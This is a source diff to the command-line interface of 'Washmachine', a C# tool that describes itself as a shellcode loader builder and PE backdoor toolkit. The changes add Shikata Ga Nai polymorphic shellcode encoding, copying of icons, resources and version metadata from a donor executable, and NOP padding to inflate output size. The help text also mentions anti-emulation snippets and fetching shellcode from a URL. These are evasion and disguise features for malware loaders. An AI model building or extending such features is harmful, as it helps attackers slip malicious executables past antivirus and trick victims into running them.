@@ -18,8 +18,9 @@ public static class Program
     private static readonly string[] RootReplCommands =
     {
         "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help",
-        "banner", "clear", "cls", "exit", "quit", "q"
+        "banner", "scheme", "clear", "cls", "exit", "quit", "q"
     };
+    private static StartupResult? _startupResult;
     private static readonly string[] SubModeCommands = { "help", "back", "exit", "..", "q" };
     private static readonly string[] ListTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
     private static readonly string[] ListTargetsBare = { "templates", "encoders", "snippets", "compilers" };
@@ -32,7 +33,12 @@ public static class Program
         ["encode"] = new[]
         {
             "--shellcode", "-s", "--shellcode-hex", "--shellcode-url", "-u", "--template", "-t",
-            "--encoder", "-e", "--envelope", "-v", "--snippet", "--verbose", "--json"
+            "--encoder", "-e", "--envelope", "-v",
+            "--shikata-ga-nai", "--sgn", "--shikata-enc", "--shikata-max",
+            "--clone-from", "--clone-resources", "--no-clone-resources",
+            "--clone-icon", "--no-clone-icon", "--clone-metadata", "--no-clone-metadata",
+            "--pad-nops",
+            "--snippet", "--verbose", "--json"
         },
         ["analyze"] = new[] { "--json" },
         ["backdoor"] = new[]
@@ -44,7 +50,7 @@ public static class Program
         },
         ["strip"] = new[] { "-o", "--output", "--mode", "-m", "--section", "--analyze", "--no-trim", "--range" },
         ["list"] = ListTargets,
-        ["provision"] = Array.Empty<string>(),
+        ["provision"] = new[] { "--core-only" },
         ["test"] = new[] { "--help", "-h" },
         ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "--all" }
     };
@@ -55,15 +61,31 @@ public static class Program
         Console.OutputEncoding = System.Text.Encoding.UTF8;
         Console.InputEncoding = System.Text.Encoding.UTF8;
 
+        ApplySchemeFromEnvironment();
+
         // One-shot mode: command provided on command line (e.g., from GUI or scripts)
         if (args.Length > 0)
         {
             return await DispatchAsync(args);
         }
 
-        // Interactive REPL mode — Metasploit-style shell
+        // Interactive REPL mode — Metasploit-style shell.
+        // Auto-run requirements + compiler checks first, then clear and show banner.
+        var paths = new AppPaths();
+        var logger = new ConsoleLogger();
+        _startupResult = await StartupChecks.RunAsync(paths, logger);
+
         ShowBanner();
         return await RunReplAsync();
+    }
+
+    private static void ApplySchemeFromEnvironment()
+    {
+        var env = Environment.GetEnvironmentVariable("WASHMACHINE_SCHEME");
+        if (!string.IsNullOrWhiteSpace(env))
+        {
+            UiColors.TrySetScheme(env);
+        }
     }
 
     /// <summary>Dispatch a single command (one-shot or from REPL).</summary>
@@ -148,6 +170,14 @@ public static class Program
                 case "help" or "?" or "--help":
                     PrintUsage();
                     continue;
+            }
+
+            // `scheme` command — before generic dispatch so it also runs without tokens.
+            if (line.StartsWith("scheme", StringComparison.OrdinalIgnoreCase))
+            {
+                var tok = TokenizeLine(line);
+                RunSchemeCommand(tok.Skip(1).ToArray());
+                continue;
             }
 
             // Tokenize input (respecting quoted strings)
@@ -635,32 +665,11 @@ public static class Program
     //  Banner
     // ═══════════════════════════════════════════════════════════════════════
 
-    private static readonly string[] FunnyFacts =
-    {
-        "VirtualAlloc: the real estate agent of process memory.",
-        "Your AV just flagged this help text as suspicious.",
-        "Kernel32.dll has been loaded more times than any webpage.",
-        "The first computer virus (Brain, 1986) had better OPSEC than most APTs.",
-        "73% of statistics about malware are made up on the spot.",
-        "CreateRemoteThread walks into a bar. The bouncer says: 'You're not on the list.'",
-        "If debugging is removing bugs, then programming is putting them in.",
-        "There are 10 types of people: those who understand binary and those who don't.",
-        "Why do programmers prefer dark mode? Because light attracts bugs.",
-        "A SQL query walks into a bar, sees two tables and asks: 'Can I join you?'",
-        "UDP joke: I'd tell you one, but you might not get it.",
-        "The average shellcode has more NOPs than a politician's speech.",
-        "Roses are #FF0000, Violets are #0000FF, All my base are belong to you.",
-        "There's no place like 127.0.0.1.",
-        "To understand recursion, you must first understand recursion.",
-    };
-
     private static void ShowBanner()
     {
-        AnsiConsole.WriteLine();
-        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(UiColors.BannerColor));
-
-        // Dynamic catalog counts
-        int templateCount = 0, sectionCount = 0, snippetCount = 0;
+        int? templateCount = null;
+        int? sectionCount = null;
+        int? snippetCount = null;
         try
         {
             var paths = new AppPaths();
@@ -672,37 +681,61 @@ public static class Program
         }
         catch { /* catalog not available yet */ }
 
-        // Info bar in a panel
-        var fact = FunnyFacts[Random.Shared.Next(FunnyFacts.Length)];
-        var infoGrid = new Grid()
-            .AddColumn(new GridColumn().NoWrap())
-            .AddColumn(new GridColumn().NoWrap())
-            .AddColumn(new GridColumn().NoWrap())
-            .AddColumn(new GridColumn().NoWrap())
-            .AddColumn(new GridColumn().NoWrap())
-            .AddColumn(new GridColumn().NoWrap())
-            .AddColumn(new GridColumn().NoWrap());
-        infoGrid.AddRow(
-            $"[bold {UiColors.Accent}]v1.0.0[/]",
-            $"[{UiColors.Muted}]│[/]",
-            $"[{UiColors.Value}]{templateCount} templates[/]",
-            $"[{UiColors.Muted}]│[/]",
-            $"[{UiColors.Value}]{sectionCount} playbook categories · {snippetCount} snippets[/]",
-            $"[{UiColors.Muted}]│[/]",
-            $"[{UiColors.Value}]5 injection methods[/]"
-        );
+        string? compilerStatus = null;
+        if (_startupResult?.CompilerKind != null)
+            compilerStatus = $"compiler: [{UiColors.Success}]{_startupResult.CompilerKind}[/]";
+        else if (_startupResult != null)
+            compilerStatus = $"compiler: [{UiColors.Error}]missing[/]";
 
-        AnsiConsole.Write(UsageFormatter.MakePanel("Washmachine", infoGrid));
+        Banner.Render(templateCount, sectionCount, snippetCount, compilerStatus);
+    }
 
-        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Shellcode Loader Builder & PE Backdoor Toolkit[/]");
-        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]by[/] [{UiColors.Link} link=https://github.com/0xhmza]0xhmza[/]");
-        AnsiConsole.WriteLine();
+    private static int RunSchemeCommand(string[] args)
+    {
+        var s = UiColors.ActiveScheme;
+        if (args.Length == 0)
+        {
+            AnsiConsole.WriteLine();
+            var table = new Table()
+                .Border(TableBorder.Rounded)
+                .BorderColor(UiColors.BoxBorderColor)
+                .Title($"[bold {s.Header}]Color schemes[/] [{s.Muted}]({ColorSchemes.Names.Count})[/]")
+                .AddColumn(new TableColumn($"[{s.Accent}]Key[/]"))
+                .AddColumn(new TableColumn($"[{s.Accent}]Name[/]"))
+                .AddColumn(new TableColumn($"[{s.Accent}]Author[/]"))
+                .AddColumn(new TableColumn($"[{s.Accent}]Swatch[/]"));
 
-        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Type[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]for commands,[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for details,[/] [{UiColors.Accent}]help --all[/] [{UiColors.Muted}]for full reference[/]");
-        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Keys:[/] [{UiColors.Accent}]↑/↓[/] history  [{UiColors.Accent}]←/→[/] move  [{UiColors.Accent}]Home/End[/] jump  [{UiColors.Accent}]Tab[/] complete");
-        AnsiConsole.WriteLine();
-        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]💡 {fact}[/]");
-        AnsiConsole.WriteLine();
+            foreach (var name in ColorSchemes.Names)
+            {
+                var sc = ColorSchemes.All[name];
+                bool active = string.Equals(name, UiColors.ActiveScheme.Name, StringComparison.OrdinalIgnoreCase)
+                            || ReferenceEquals(sc, UiColors.ActiveScheme);
+                string key = active ? $"[bold {s.Success}]▶ {name}[/]" : $"[{s.Value}]{name}[/]";
+                string swatch =
+                    $"[{sc.BannerPrimary}]██[/]" +
+                    $"[{sc.BannerSecondary}]██[/]" +
+                    $"[{sc.BannerTertiary}]██[/]" +
+                    $"[{sc.Success}]██[/]" +
+                    $"[{sc.Warning}]██[/]" +
+                    $"[{sc.Error}]██[/]";
+                table.AddRow(key, $"[{s.Value}]{Markup.Escape(sc.Name)}[/]", $"[{s.Muted}]{Markup.Escape(sc.Author)}[/]", swatch);
+            }
+            AnsiConsole.Write(table);
+            AnsiConsole.MarkupLine($"  [{s.Muted}]Use[/] [{s.Accent}]scheme <key>[/] [{s.Muted}]to switch.[/]");
+            return 0;
+        }
+
+        if (!UiColors.TrySetScheme(args[0]))
+        {
+            AnsiConsole.MarkupLine($"[{s.Error}]Unknown scheme:[/] {Markup.Escape(args[0])}");
+            AnsiConsole.MarkupLine($"[{s.Muted}]Known:[/] {string.Join(", ", ColorSchemes.Names)}");
+            return 1;
+        }
+
+        var now = UiColors.ActiveScheme;
+        AnsiConsole.MarkupLine($"[{now.Success}]✓ Scheme set to[/] [{now.Accent}]{Markup.Escape(now.Name)}[/] [{now.Muted}]({Markup.Escape(now.Author)})[/]");
+        ShowBanner();
+        return 0;
     }
 
     // ═══════════════════════════════════════════════════════════════════════
@@ -723,6 +756,14 @@ public static class Program
         string? templateId = null;
         string? encoderIndex = null;
         string? envelopeIndex = null;
+        bool shikataGaNai = false;
+        string? shikataEncodeCount = null;
+        string? shikataMaxBytes = null;
+        string? cloneFromExe = null;
+        bool? cloneResources = null;
+        bool? cloneIcon = null;
+        bool? cloneMetadata = null;
+        string? nopPaddingRaw = null;
         var snippets = new Dictionary<string, string>();
         bool verbose = false;
         bool jsonOutput = false;
@@ -743,6 +784,28 @@ public static class Program
                     encoderIndex = args[++i]; break;
                 case "--envelope" or "-v" when i + 1 < args.Length:
                     envelopeIndex = args[++i]; break;
+                case "--shikata-ga-nai" or "--sgn":
+                    shikataGaNai = true; break;
+                case "--shikata-enc" when i + 1 < args.Length:
+                    shikataEncodeCount = args[++i]; break;
+                case "--shikata-max" when i + 1 < args.Length:
+                    shikataMaxBytes = args[++i]; break;
+                case "--clone-from" when i + 1 < args.Length:
+                    cloneFromExe = args[++i]; break;
+                case "--clone-resources":
+                    cloneResources = true; break;
+                case "--no-clone-resources":
+                    cloneResources = false; break;
+                case "--clone-icon":
+                    cloneIcon = true; break;
+                case "--no-clone-icon":
+                    cloneIcon = false; break;
+                case "--clone-metadata":
+                    cloneMetadata = true; break;
+                case "--no-clone-metadata":
+                    cloneMetadata = false; break;
+                case "--pad-nops" when i + 1 < args.Length:
+                    nopPaddingRaw = args[++i]; break;
                 case "--snippet" when i + 1 < args.Length:
                     var kv = args[++i].Split('=', 2);
                     if (kv.Length == 2) snippets[kv[0]] = kv[1];
@@ -761,14 +824,70 @@ public static class Program
             return 1;
         }
 
+        if (cloneFromExe == null && (cloneResources.HasValue || cloneIcon.HasValue || cloneMetadata.HasValue))
+        {
+            AnsiConsole.MarkupLine("[red]Error:[/] --clone-* flags require --clone-from <exe>.");
+            return 1;
+        }
+
+        if (!string.IsNullOrWhiteSpace(cloneFromExe) && !File.Exists(cloneFromExe))
+        {
+            AnsiConsole.MarkupLine($"[red]Error:[/] clone source EXE not found: {Markup.Escape(cloneFromExe)}");
+            return 1;
+        }
+
+        long nopPaddingBytes = 0;
+        if (nopPaddingRaw != null)
+        {
+            if (!long.TryParse(nopPaddingRaw, NumberStyles.Integer, CultureInfo.InvariantCulture, out nopPaddingBytes) || nopPaddingBytes <= 0)
+            {
+                AnsiConsole.MarkupLine("[red]Error:[/] --pad-nops must be a positive integer byte count.");
+                return 1;
+            }
+        }
+
+        if (shikataEncodeCount != null)
+        {
+            if (!int.TryParse(shikataEncodeCount, NumberStyles.Integer, CultureInfo.InvariantCulture, out int count) || count <= 0)
+            {
+                AnsiConsole.MarkupLine("[red]Error:[/] --shikata-enc must be a positive integer.");
+                return 1;
+            }
+
+            shikataGaNai = true;
+            shikataEncodeCount = count.ToString(CultureInfo.InvariantCulture);
+        }
+
+        if (shikataMaxBytes != null)
+        {
+            if (!int.TryParse(shikataMaxBytes, NumberStyles.Integer, CultureInfo.InvariantCulture, out int maxBytes) || maxBytes <= 0)
+            {
+                AnsiConsole.MarkupLine("[red]Error:[/] --shikata-max must be a positive integer.");
+                return 1;
+            }
+
+            shikataGaNai = true;
+            shikataMaxBytes = maxBytes.ToString(CultureInfo.InvariantCulture);
+        }
+
+        if (!string.IsNullOrWhiteSpace(cloneFromExe))
+        {
+            cloneResources ??= true;
+            cloneIcon ??= true;
+            cloneMetadata ??= true;
+        }
+
         var logger = new ConsoleLogger();
         if (verbose) logger.VerboseEnabled = true;
 
         var paths = new AppPaths();
 
-        // Ensure requirements (Bin2Shell) before compilation
+        // Ensure external requirements before compilation.
+        // SGN is provisioned only when Shikata Ga Nai is requested.
         var provisioner = new RequirementProvisioner(paths, logger);
-        await provisioner.EnsureRequirementsAsync(new ConsoleProgressReporter());
+        await provisioner.EnsureRequirementsAsync(
+            new ConsoleProgressReporter(),
+            includeOptionalTools: shikataGaNai);
 
         var runner = new Bin2ShellRunner(paths);
         var snippetService = new YamlCodeSnippetCatalogService(paths);
@@ -782,6 +901,9 @@ public static class Program
             [UiDataKeys.ShellcodeRaw] = shellcodeHex ?? "",
             [UiDataKeys.ShellcodeUrl] = shellcodeUrl ?? "",
             [UiDataKeys.ShellcodeUrlFile] = "",
+            [UiDataKeys.ShikataGaNaiEnabled] = shikataGaNai ? bool.TrueString : bool.FalseString,
+            [UiDataKeys.ShikataGaNaiEncodeCount] = shikataEncodeCount ?? "1",
+            [UiDataKeys.ShikataGaNaiMaxBytes] = shikataMaxBytes ?? "50",
         };
 
         var comboBoxes = new Dictionary<string, string>
@@ -883,6 +1005,23 @@ public static class Program
                     .SpinnerStyle(Style.Parse("cyan"))
                     .StartAsync("Encoding...", async _ => await compiler.CompileAsync(data));
 
+            var postCompileNotes = new List<string>();
+            bool wantsPostCompile = !string.IsNullOrWhiteSpace(cloneFromExe) || nopPaddingBytes > 0;
+            if (wantsPostCompile &&
+                result.Success &&
+                !string.IsNullOrWhiteSpace(result.OutputExePath) &&
+                File.Exists(result.OutputExePath))
+            {
+                var postCompile = new PePostCompileService(logger);
+                var options = new PostCompileOptions(
+                    cloneFromExe,
+                    cloneResources ?? false,
+                    cloneIcon ?? false,
+                    cloneMetadata ?? false,
+                    nopPaddingBytes);
+                postCompileNotes.AddRange(postCompile.Apply(result.OutputExePath, options));
+            }
+
             if (jsonOutput)
             {
                 var output = new
@@ -891,6 +1030,7 @@ public static class Program
                     result.OutputExePath,
                     result.GeneratedSourcePath,
                     Notes = result.Notes,
+                    PostCompileNotes = postCompileNotes,
                     CompilerPath = result.Discovery?.Best?.Path,
                     ConversionSuccess = result.ConversionResult.Success,
                     ConversionError = result.ConversionResult.Error,
@@ -900,6 +1040,8 @@ public static class Program
             else
             {
                 foreach (var note in result.Notes)
+                    logger.Info(note);
+                foreach (var note in postCompileNotes)
                     logger.Info(note);
 
                 if (result.Success)
@@ -2606,6 +2748,13 @@ public static class Program
         var logger = new ConsoleLogger();
         var paths = new AppPaths();
         var provisioner = new RequirementProvisioner(paths, logger);
+        bool coreOnly = args.Any(a => string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase));
+        var unknownProvisionArg = args.FirstOrDefault(a => !string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase));
+        if (unknownProvisionArg != null)
+        {
+            AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] Unknown option for provision: {Markup.Escape(unknownProvisionArg)}");
+            return 1;
+        }
 
         try
         {
@@ -2624,7 +2773,9 @@ public static class Program
                     var task = ctx.AddTask("Provisioning...");
                     task.IsIndeterminate = true;
                     var reporter = new SpectreProgressReporter(task);
-                    await provisioner.EnsureRequirementsAsync(reporter);
+                    await provisioner.EnsureRequirementsAsync(
+                        reporter,
+                        includeOptionalTools: !coreOnly);
                 });
 
             AnsiConsole.WriteLine();
@@ -2721,6 +2872,14 @@ public static class Program
                 new UsageOption("--template, -t <id>", "Template ID (use 'list --templates' to see options)", "shellcode-minimal"),
                 new UsageOption("--encoder, -e <index>", "Bin2Shell encoder index", "0 (none)"),
                 new UsageOption("--envelope, -v <index>", "Bin2Shell envelope index", "0 (none)"),
+                new UsageOption("--shikata-ga-nai, --sgn", "Enable Shikata Ga Nai preprocessing before Bin2Shell"),
+                new UsageOption("--shikata-enc <count>", "Shikata Ga Nai iteration count", "1"),
+                new UsageOption("--shikata-max <bytes>", "Shikata Ga Nai max decoder-obfuscation bytes", "50"),
+                new UsageOption("--clone-from <exe>", "Clone post-compile resources/metadata/icon from source EXE"),
+                new UsageOption("--clone-resources | --no-clone-resources", "Enable/disable general resource cloning", "enabled when --clone-from is set"),
+                new UsageOption("--clone-icon | --no-clone-icon", "Enable/disable icon resource cloning", "enabled when --clone-from is set"),
+                new UsageOption("--clone-metadata | --no-clone-metadata", "Enable/disable VERSIONINFO metadata cloning", "enabled when --clone-from is set"),
+                new UsageOption("--pad-nops <bytes>", "Append NOP bytes to increase final executable size"),
                 new UsageOption("--snippet <section=id>", "Override a snippet section (repeatable, see below)"),
                 new UsageOption("--verbose", "Enable verbose logging"),
                 new UsageOption("--json", "Output results as JSON"),
@@ -2730,6 +2889,8 @@ public static class Program
                 new UsageExample("encode -s payload.bin", "Encode with the default template"),
                 new UsageExample("encode -s payload.bin -t shellcode-minimal", "Specify a template explicitly"),
                 new UsageExample("encode --shellcode-hex FC4883E4F0... -e 1", "Encode from hex with XOR encoder"),
+                new UsageExample("encode -s payload.bin --sgn --shikata-enc 2 --shikata-max 64", "Apply Shikata Ga Nai before Bin2Shell"),
+                new UsageExample("encode -s payload.bin --clone-from donor.exe --pad-nops 1048576", "Clone EXE properties and add 1MB of NOP padding"),
                 new UsageExample("encode -u http://host/shell.bin --verbose", "Fetch shellcode from URL"),
                 new UsageExample("encode -s payload.bin --snippet antiemulation=SirAllocALot", "Override the anti-emulation snippet"),
                 new UsageExample("encode -s p.bin --snippet antiemulation=SirAllocALot --snippet guardrails=domain_check", "Stack multiple snippets"),
@@ -2737,6 +2898,11 @@ public static class Program
             Notes: new[]
             {
                 "Provide exactly one shellcode source: --shellcode, --shellcode-hex, or --shellcode-url.",
+                "",
+                "When enabled, Shikata Ga Nai runs before Bin2Shell to polymorph the raw shellcode bytes.",
+                "",
+                "Post-compile options can clone resources/icon/VERSIONINFO from another EXE and",
+                "optionally append NOP bytes to inflate output size.",
                 "",
                 "The encode command processes shellcode through Bin2Shell encoding, merges it into",
                 "a C++ template with optional evasion snippets, and compiles the final loader.",
@@ -2812,15 +2978,17 @@ public static class Program
     {
         UsageFormatter.Print(new CommandUsage(
             Name: "provision",
-            Syntax: "provision",
-            Description: "Download and install required external tools (Bin2Shell)",
+            Syntax: "provision [[--core-only]]",
+            Description: "Download and install required external tools",
             Examples: new[]
             {
-                new UsageExample("provision", "Download and install Bin2Shell"),
+                new UsageExample("provision", "Download and install Bin2Shell + optional tools"),
+                new UsageExample("provision --core-only", "Download only Bin2Shell"),
             },
             Notes: new[]
             {
-                "Run this once after installation to set up Bin2Shell for encoding support.",
+                "Run this once after installation to set up encoding prerequisites.",
+                "--core-only skips optional tooling and provisions Bin2Shell only.",
                 "Requires an active internet connection.",
             }));
         return 0;
@@ -2885,7 +3053,7 @@ public static class Program
     private static int PrintExtendedHelp()
     {
         AnsiConsole.WriteLine();
-        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(UiColors.BannerColor));
+        Banner.Render();
 
         var headerRows = new Rows(
             new Markup($"[{UiColors.Muted}]Scrollable reference for all commands and options.[/]"),
